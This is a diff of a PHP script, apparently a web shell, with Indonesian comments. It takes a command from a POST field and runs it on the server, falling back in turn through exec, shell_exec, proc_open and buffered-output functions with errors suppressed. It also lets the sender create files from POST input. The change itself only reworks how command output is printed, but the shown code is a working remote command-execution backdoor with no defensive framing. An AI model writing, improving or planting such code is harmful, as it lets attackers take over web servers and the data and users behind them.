@@ -419,7 +419,11 @@ if (isset($_POST['cmd'])) {
         $output = @ob_get_contents();
         @ob_end_clean();
         if (!empty($output)) {
-            goto output_result; // Lompat langsung ke output
+            // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
+            echo "<pre>Result Code: $resultCode</pre>";
+            echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+            echo "</div>";
+            return; // Hentikan eksekusi fungsi setelah berhasil
         }
     }
 
@@ -429,7 +433,11 @@ if (isset($_POST['cmd'])) {
         @exec($cmd, $results, $resultCode);
         if (!empty($results)) {
             $output = implode("\n", $results);
-            goto output_result; // Lompat langsung ke output
+            // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
+            echo "<pre>Result Code: $resultCode</pre>";
+            echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+            echo "</div>";
+            return; // Hentikan eksekusi fungsi setelah berhasil
         }
     }
 
@@ -440,7 +448,11 @@ if (isset($_POST['cmd'])) {
         $output = @ob_get_contents();
         @ob_end_clean();
         if (!empty($output)) {
-            goto output_result; // Lompat langsung ke output
+            // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
+            echo "<pre>Result Code: $resultCode</pre>";
+            echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+            echo "</div>";
+            return; // Hentikan eksekusi fungsi setelah berhasil
         }
     }
 
@@ -459,7 +471,11 @@ if (isset($_POST['cmd'])) {
             @fclose($pipes[2]);
             $resultCode = @proc_close($process);
             if (!empty($output)) {
-                goto output_result; // Lompat langsung ke output
+                // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
+                echo "<pre>Result Code: $resultCode</pre>";
+                echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                echo "</div>";
+                return; // Hentikan eksekusi fungsi setelah berhasil
             }
         }
     }
@@ -469,16 +485,20 @@ if (isset($_POST['cmd'])) {
         $output = @shell_exec($cmd);
         $resultCode = ($output === null) ? 1 : 0; // Jika output null, anggap gagal
         if (!empty($output)) {
-            goto output_result; // Lompat langsung ke output
+            // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
+            echo "<pre>Result Code: $resultCode</pre>";
+            echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+            echo "</div>";
+            return; // Hentikan eksekusi fungsi setelah berhasil
         }
     }
 
-output_result:
-    // Output result
+    // Jika tidak ada output yang berhasil
     echo "<pre>Result Code: $resultCode</pre>";
-    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>"; // Menghindari XSS
+    echo "<pre>No output generated or command failed.</pre>";
     echo "</div>";
 }
+
         // Create a new file
         if (isset($_POST['createFile'])) {
             $fileName = $_POST['fileName'];
